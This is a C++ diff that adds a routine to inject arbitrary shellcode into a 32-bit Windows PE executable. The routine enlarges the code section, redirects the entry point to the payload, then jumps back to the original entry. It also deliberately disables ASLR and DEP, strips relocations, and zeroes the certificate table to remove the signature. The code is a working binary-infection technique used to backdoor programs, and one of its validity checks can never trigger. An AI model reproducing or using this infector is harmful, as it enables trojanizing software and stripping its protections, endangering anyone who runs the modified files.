@@ -427,4 +427,89 @@ namespace PE
 
 		WriteBinary(*Parsed_PE.get(), out_path, size_of_changed_pe);
 	}
+
+	void Inject_Resize_Code(char* pe_file, size_t size_of_pe, char xcode[], size_t size_of_xcode, const std::string& out_path)
+	{
+		auto is_valid = true;
+		auto Parsed_PE = ParsePE(pe_file);
+
+		if (Parsed_PE.get()->ids.e_magic != IMAGE_DOS_SIGNATURE)
+		{
+			std::cout << "Sorry, I have no idea how to deal with this kind of files :/\n";
+			exit(1);
+		}
+
+		if (Parsed_PE.get()->inh32.OptionalHeader.ImageBase < 0x400000 && Parsed_PE.get()->inh32.OptionalHeader.ImageBase > 0x1000000)
+		{
+			std::cout << "Sorry, I have no idea how to deal with this kind of files :/\n";
+			exit(1);
+		}
+
+		// tuple<WORD, size_t, size_t> ready_section_index_size{};
+		WORD code_section{};
+		for (WORD i = 0; i < Parsed_PE.get()->inh32.FileHeader.NumberOfSections; ++i)
+		{
+			if (Parsed_PE.get()->ish.get()[i].Characteristics & IMAGE_SCN_CNT_CODE)
+			{
+				code_section = { i };
+				break;
+			}
+		}
+
+		auto imagebase = Parsed_PE.get()->inh32.OptionalHeader.ImageBase;
+		auto OEP = Parsed_PE.get()->inh32.OptionalHeader.AddressOfEntryPoint;
+		auto image_base_OEP = imagebase + OEP;
+		char push[] = "\x68"; // push
+		char esp[] = "\xff\x24\x24"; // jmp [esp]
+		char hex_oep[] = { image_base_OEP >> 0 & 0xFF, image_base_OEP >> 8 & 0xFF, image_base_OEP >> 16 & 0xFF, image_base_OEP >> 24 & 0xFF }; // OEP
+		auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 4;
+
+		auto Last_of_Original_Raw_Address = Parsed_PE.get()->ish.get()[code_section].SizeOfRawData;
+		auto aligned_size_of_xcode = Parsed_PE.get()->inh32.OptionalHeader.FileAlignment * (inj_size / Parsed_PE.get()->inh32.OptionalHeader.FileAlignment) + Parsed_PE.get()->inh32.OptionalHeader.FileAlignment;
+		Parsed_PE.get()->ish.get()[code_section].SizeOfRawData += aligned_size_of_xcode; // resize size of code section
+
+
+		for (size_t i = 0; i < Parsed_PE.get()->inh32.FileHeader.NumberOfSections; ++i)
+		{
+			if (Parsed_PE.get()->ish.get()[i].PointerToRawData > Parsed_PE.get()->ish.get()[code_section].PointerToRawData)
+			{
+				Parsed_PE.get()->ish.get()[i].PointerToRawData += aligned_size_of_xcode;
+			}
+		}
+
+		auto section_ = code_section;
+		auto index_ = Last_of_Original_Raw_Address;
+
+		auto AEP = index_ + Parsed_PE.get()->ish.get()[section_].VirtualAddress;
+		Parsed_PE.get()->inh32.OptionalHeader.AddressOfEntryPoint = AEP;
+
+
+		auto inj_section = *Parsed_PE.get()->Sections[section_].first.get();
+		memcpy(&inj_section[index_], xcode, size_of_xcode - 1);
+		memcpy(&inj_section[index_ + size_of_xcode - 1], push, sizeof push);
+		memcpy(&inj_section[index_ + size_of_xcode + sizeof push - 2], hex_oep, sizeof hex_oep);
+		memcpy(&inj_section[index_ + sizeof hex_oep + sizeof push + size_of_xcode - 2], esp, sizeof esp);
+
+		// disable ASLR
+		Parsed_PE.get()->inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
+		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
+		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[5].Size = { 0 };
+		Parsed_PE.get()->inh32.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
+
+		// disable DEP
+		Parsed_PE.get()->inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
+
+		// zeroize CERTIFICATE table's offset and size
+		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
+		Parsed_PE.get()->inh32.OptionalHeader.DataDirectory[4].Size = { 0 };
+
+		// If v_sz != 0 and v_sz < r_sz, increase v_sz by sizeof(xcode).
+		if (Parsed_PE.get()->ish.get()[code_section].SizeOfRawData > Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize && Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize != 0)
+			Parsed_PE.get()->ish.get()[code_section].Misc.VirtualSize += inj_size + 0x17;  // just enough
+
+		auto size_of_changed_pe = size_of_pe + aligned_size_of_xcode;
+
+		WriteBinary(*Parsed_PE.get(), out_path, size_of_changed_pe);
+
+	}
 }
